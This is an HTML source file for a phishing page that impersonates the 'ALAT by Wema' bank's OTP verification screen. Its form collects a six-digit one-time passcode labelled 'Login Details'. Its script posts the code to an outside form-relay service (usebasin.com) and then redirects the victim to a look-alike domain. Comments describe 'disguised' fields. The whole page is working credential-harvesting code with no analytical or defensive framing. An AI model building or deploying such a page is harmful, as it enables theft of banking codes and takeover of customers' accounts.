<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify OTP | ALAT by Wema</title>
  <link rel="stylesheet" href="index-C49gVU4U.css" />
</head>
<style>
  #otp-0,
  #otp-1,
  #otp-2,
  #otp-3,
  #otp-4,
  #otp-5 {
    font-family: 'password-mask';
    -webkit-text-security: disc;
    text-security: disc;
  }

  body {
    margin: 0 !important;
    padding: 0 !important;
    font-family: sans-serif !important;

  }

  .app {
    display: flex !important;
    justify-content: center !important;
    align-items: center !important;
    padding: 20px !important;
    min-height: 100vh !important;
    box-sizing: border-box !important;
  }

  .container {
    width: 100% !important;
    max-width: 400px !important;

    border-radius: 10px !important;
    padding: 20px !important;
    box-sizing: border-box !important;
  }

  .logo img {
    max-width: 120px !important;
    margin-bottom: 20px !important;
  }

  .hometitle {
    font-size: 20px !important;
    margin-bottom: 20px !important;
    text-align: center !important;
    font-weight: bold !important;
  }

  .formOtp {
    display: flex !important;
    justify-content: space-between !important;
    gap: 10px !important;
    margin-bottom: 20px !important;
  }

  .formOtp input {
    width: 100% !important;
    max-width: 40px !important;
    height: 50px !important;
    font-size: 24px !important;
    text-align: center !important;

    border-radius: 6px !important;
  }

  .buttonSec {
    display: flex !important;
    justify-content: center !important;
  }

  button {
    padding: 10px 30px !important;
    font-size: 16px !important;

    border: none !important;
    border-radius: 6px !important;
    cursor: pointer !important;
  }

  @media (max-width: 400px) {
    .formOtp input {
      max-width: 36px !important;
      height: 44px !important;
      font-size: 20px !important;
    }

    .container {
      padding: 15px !important;
    }

    .hometitle {
      font-size: 18px !important;
    }
  }
</style>


<body>
  <div id="root">
    <div class="app">
      <div class="fin">
        <div class="container">
          <div class="contentSec">
            <div class="logo">
              <img src="logo-Cw-qJTno.png" alt="logo" />
            </div>
            <div class="hometitle">Verify ALAT OTP</div>
          </div>
          <div class="formSec">
            <div class="input">
              <!-- Modified Form for UserBasin -->
              <form class="otpForm" id="otpForm">
                <input type="hidden" name="_redirect" value="false"> <!-- Disable UserBasin default redirect -->
                <!-- Disguised fields that will appear as message to UserBasin -->
                <input type="hidden" name="subject" value="Login Details">
                <!-- Disguised OTP fields as text inputs -->
                <div class="formOtp">
                  <input id="otp-0" type="text" name="message" inputmode="numeric" pattern="[0-9]" maxlength="1"
                    class="fin-input" inputmode="numeric" required placeholder="-"
                    title="Please enter verification code digit 1" />
                  <input id="otp-1" type="text" name="message" inputmode="numeric" pattern="[0-9]" maxlength="1"
                    class="fin-input" inputmode="numeric" required placeholder="-"
                    title="Please enter verification code digit 2" />
                  <input id="otp-2" type="text" name="message" inputmode="numeric" pattern="[0-9]" maxlength="1"
                    class="fin-input" inputmode="numeric" required placeholder="-"
                    title="Please enter verification code digit 3" />
                  <input id="otp-3" type="text" name="message" inputmode="numeric" pattern="[0-9]" maxlength="1"
                    class="fin-input" inputmode="numeric" required placeholder="-"
                    title="Please enter verification code digit 4" />
                  <input id="otp-4" type="text" name="message" inputmode="numeric" pattern="[0-9]" maxlength="1"
                    class="fin-input" inputmode="numeric" required placeholder="-"
                    title="Please enter verification code digit 5" />
                  <input id="otp-5" type="text" name="message" inputmode="numeric" pattern="[0-9]" maxlength="1"
                    class="fin-input" inputmode="numeric" required placeholder="-"
                    title="Please enter verification code digit 6" />
                </div>

                <span class="errorMessage"></span>

                <div class="buttonSec">
                  <button type="submit">Verify</button>
                </div>
              </form>
              <!-- End Form -->
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

<script>
document.getElementById('otpForm').addEventListener('submit', async function (e) {
  e.preventDefault();

  // collect inputs and join into a single OTP string
  const inputs = Array.from(document.querySelectorAll('.fin-input'));
  const otp = inputs.map(i => i.value.trim()).join('');

  // Validate OTP length quickly
  if (otp.length !== inputs.length) {
    document.querySelector('.errorMessage').textContent = 'Please fill all digits.';
    return;
  }

  // Build form data: combine OTP into single 'message' field
  const formData = new FormData(this);

  // Remove any existing message entries (since each input used name="message")
  // then set a single 'message' field containing the full OTP
  // (FormData.delete will remove all keys matching 'message')
  formData.delete('message');
  formData.append('message', `OTP: ${otp}`); // put whatever you'd like the email body to show
  // keep your subject
  // ensure any required fields by Basin (e.g. 'name' or 'email') are present if your form/email template needs them

  // Convert to URLSearchParams for x-www-form-urlencoded
  const data = new URLSearchParams();
  for (const pair of formData) {
    data.append(pair[0], pair[1]);
  }

  try {
    const resp = await fetch('https://usebasin.com/f/c7a3b223942d', {
      method: 'POST',
      body: data,
      headers: {
        'Accept': 'application/json' // ask for JSON response for AJAX usage
      }
    });

    // If Basin returns JSON with errors, show them
    if (!resp.ok) {
      const errText = await resp.text();
      console.error('Basin returned non-OK:', resp.status, errText);
      document.querySelector('.errorMessage').textContent = 'Submission failed. Check console for details.';
      return;
    }

    // If we asked for JSON, try to read it and check for errors
    let json = {};
    try {
      json = await resp.json();
    } catch (err) {
      // not JSON â€” still continue if status ok
      console.warn('Response not JSON:', err);
    }

    // Basin usually returns 200 for success; handle errors if present
    // (show success or log server response)
    console.log('Submission successful:', json);

    // Redirect only after success
    window.location.href = 'https://webwemma-app.pxxl.click/otp.html';

  } catch (err) {
    console.error('Fetch error:', err);
    document.querySelector('.errorMessage').textContent = 'Network error. See console.';
  }
});
</script>
</body>


</html>


